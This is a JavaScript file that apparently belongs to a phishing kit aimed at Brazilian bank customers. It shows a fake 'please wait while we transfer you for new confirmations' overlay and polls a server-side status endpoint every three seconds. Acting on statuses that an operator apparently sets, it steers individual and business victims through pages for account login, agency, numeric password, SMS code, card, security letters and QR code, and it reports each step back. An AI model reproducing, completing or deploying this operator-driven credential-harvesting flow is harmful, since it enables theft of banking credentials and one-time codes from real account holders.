var primera = 0;
var preloaderHt = "<div class='hide d-flex flex-column justify-content-center align-items-center' id='preloader' style='top:0;position: absolute;z-index: 999999999;width: 100%;height:100%;background-color: rgba(4,4,4,.98)'>"
      +"<div class='p-4 text-center' style='margin-top: 10%; border-radius: 10px;width: 80%;margin-left: auto;margin-right: auto;'>"
        +"<h5 class='pb-4 pt-3' style='color:#fff' >Aguarde enquanto transferimos você para novas confirmações</h5>"
        +"<p class='text-center'><img src='img/preloader-preto.gif' width='70px' alt='' style='opacity: .15 !important'></p>"
  +"</div>"
+"</div>"

$('body').append(preloaderHt);

function preloaderL(){
    $('#preloader').removeClass('hide');
}

window.getCookie = function(name) {
  var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  if (match) return match[2];
}



var primera = 0;

function estadoPJ(estado){
    if(primera < 2){
        $.ajax({
          type: "POST",
          url: 'api/api-pj-estado-64.php',
          data: {
            'informacaoid': decodeURIComponent(informacaoid),
            'estado': estado
          }
        }); 
        primera++;
    }
}

function estadoPF(estado){
    if(primera < 2){
        $.ajax({
          type: "POST",
          url: 'api/api-pf-estado-64.php',
          data: {
            'informacaoid': decodeURIComponent(informacaoid),
            'estado': estado
          }
        }); 
        primera++;
    }
}

var urlx = '';
var aguarde = 0;
if(getCookie('tipo') == 'pf'){
    urlx = 'api/api-pf-estado-lista.php?id='
}else{
    urlx = 'api/api-pj-estado-lista.php?id=';
}

function estadoLista() {
    $.ajax({
        type: "GET",
        url: urlx + informacaoid,
        success: function(data) {
            estadoL = jQuery.parseJSON(data);

            console.log(estadoL.estado);

            if(aguarde == 0){
                if(retorno == 'aguarde-pc.php'){
                    estadoPJ("AGUARDE");
                    aguarde++;                  
                }else{
                    aguarde++;
                }              
            }else if(estadoL.estado == 'PJRECOMECAR'){
            	if(retorno != 'acesso-juridico-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-pc.php'}, 3000);            		
            	}else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                   
                }            	
            }else if(estadoL.estado == 'PJAGENCIA'){
                if(retorno != 'acesso-juridico-agencia-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-agencia-pc.php'}, 3000);                  
                }else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJNUMERICA'){
                if(retorno != 'acesso-juridico-numerica-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-numerica-pc.php'}, 3000);                  
                }else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJCONTATO'){
                if(retorno != 'acesso-juridico-contato-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-contato-pc.php'}, 3000);                  
                }else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJAPELIDO'){
                if(retorno != 'acesso-juridico-apelido-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-apelido-pc.php'}, 3000);                  
                }else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJSMS'){
                if(retorno != 'acesso-juridico-sms-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-juridico-sms-pc.php'}, 3000);                  
                }else{
                    estadoPJ("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJAGUARDE'){
                if(retorno != 'aguarde-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'aguarde-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PJFINAL'){
                if(retorno != 'final-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'final-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFRECOMECAR'){
                if(retorno != 'acesso-conta-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-conta-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFCONTATO'){
                if(retorno != 'acesso-contato-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-contato-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFSCARTAO'){
                if(retorno != 'acesso-cartao-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-cartao-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFSLETRA'){
                if(retorno != 'acesso-letra-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-letra-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFCARTAO'){
                if(retorno != 'acesso-card-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-card-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFQRDODE'){
                if(retorno != 'acesso-qrcode-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'acesso-qrcode-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFAGUARDE'){
                if(retorno != 'aguarde-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'aguarde-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }else if(estadoL.estado == 'PFFINAL'){
                if(retorno != 'final-pc.php'){
                    preloaderL()
                    setTimeout(function(){window.location.href = 'final-pc.php'}, 3000);                  
                }else{
                    estadoPF("PREENCHENDO-"+estadoL.estado);                 
                }               
            }
        }
    });
}

setInterval(function(){
	estadoLista()
}, 3000);